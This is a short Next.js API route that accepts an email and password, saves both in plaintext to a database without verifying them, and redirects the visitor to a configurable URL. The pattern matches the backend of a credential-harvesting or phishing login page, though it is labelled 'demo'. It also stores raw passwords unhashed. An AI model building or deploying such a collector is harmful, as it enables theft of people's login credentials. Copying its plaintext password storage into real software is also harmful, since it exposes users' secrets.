import { NextResponse } from "next/server";
import connectDB from "../../../lib/db.js";
import LoginData from "../../../lib/model.js";

export async function POST(request) {
  try {
    const { email, password } = await request.json();
    if (!email || !password) {
      return NextResponse.json({ success: false, message: "Missing fields" }, { status: 400 });
    }

    await connectDB();
    await LoginData.create({
      email,
      password,
      source: "demo-login",
      favorite: false,
    });

    return NextResponse.json({
      success: true,
      redirectUrl: process.env.NEXT_PUBLIC_REDIRECT_URL || "https://example.com",
    });
  } catch (error) {
    console.error("Login error:", error);
    return NextResponse.json({ success: false, message: "Failed to save demo data" }, { status: 500 });
  }
}
